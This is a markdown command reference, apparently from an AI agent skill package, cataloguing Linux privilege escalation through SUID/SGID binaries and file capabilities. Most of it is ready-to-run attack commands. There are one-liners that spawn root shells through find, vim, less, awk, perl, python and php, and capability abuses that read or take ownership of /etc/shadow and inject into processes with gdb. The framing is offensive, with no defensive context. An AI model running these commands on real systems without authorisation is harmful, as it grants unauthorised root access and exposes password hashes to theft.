# SUID/SGID Binaries and Linux Capabilities

Exhaustive enumeration and exploitation catalog for the two most common
Linux local privilege escalation vectors: SUID/SGID binaries and file
capabilities. The core methodology (check GTFOBins for every binary
found, prefer `-p` shells, inspect custom binaries) lives in
`SKILL.md`; this file is the command reference.

## Contents

- [SUID/SGID Binaries](#suidsgid-binaries)
  - [Find SUID/SGID Files](#find-suidsgid-files)
  - [Exploiting SUID Binaries](#exploiting-suid-binaries)
- [Linux Capabilities](#linux-capabilities)
  - [What Are Capabilities](#what-are-capabilities)
  - [Enumerate Capabilities](#enumerate-capabilities)
  - [Exploitable Capabilities](#exploitable-capabilities)

## SUID/SGID Binaries

**Find SUID/SGID Files:**
```bash
# Find SUID binaries (4000)
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SGID binaries (2000)
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Find both SUID and SGID
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null

# Interesting locations
find /usr/local/bin -perm -4000 2>/dev/null
find /usr/bin -perm -4000 2>/dev/null
find /bin -perm -4000 2>/dev/null
```

**Exploiting SUID Binaries:**
```bash
# Check GTFOBins for each SUID binary found
# https://gtfobins.github.io/

# Common exploitable SUID binaries:

# /usr/bin/find
find . -exec /bin/bash -p \; -quit

# /usr/bin/vim
vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-pc", "reset; exec bash -p")'

# /usr/bin/nmap (old versions)
nmap --interactive
!sh

# /usr/bin/less
less /etc/profile
!/bin/bash

# /usr/bin/awk
awk 'BEGIN {system("/bin/bash -p")}'

# /usr/bin/perl
perl -e 'exec "/bin/bash";'

# /usr/bin/python
python -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# /usr/bin/php
php -r "pcntl_exec('/bin/bash', ['-p']);"

# Custom SUID binary (check for command injection, buffer overflow)
strings /path/to/suid_binary
ltrace /path/to/suid_binary
strace /path/to/suid_binary
```

## Linux Capabilities

**What Are Capabilities:**
Capabilities divide root privileges into distinct units. A binary with specific capabilities can perform privileged operations without full root.

**Enumerate Capabilities:**
```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null

# Check specific binary
getcap /usr/bin/python3.8

# Check process capabilities
cat /proc/self/status | grep Cap
getpcaps $$

# Decode capability value
capsh --decode=0000003fffffffff
```

**Exploitable Capabilities:**
```bash
# cap_setuid - allows changing UID
# Python with cap_setuid
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'

# cap_dac_read_search - bypass file read permission checks
# tar with cap_dac_read_search
tar cvf shadow.tar /etc/shadow
tar -xvf shadow.tar

# cap_chown - change file ownership
# Python with cap_chown
python -c 'import os; os.chown("/etc/shadow",1000,1000)'

# cap_sys_admin - various admin operations (often container escape)
# Can mount filesystems, load kernel modules, etc.

# cap_sys_ptrace - inject code into processes
# gdb with cap_sys_ptrace
gdb -p <PID>
call system("id")

# cap_sys_module - load kernel modules
# Can load malicious kernel module for root

# cap_net_raw + cap_net_admin - network packet manipulation
# tcpdump with these caps can be used for ARP spoofing
```
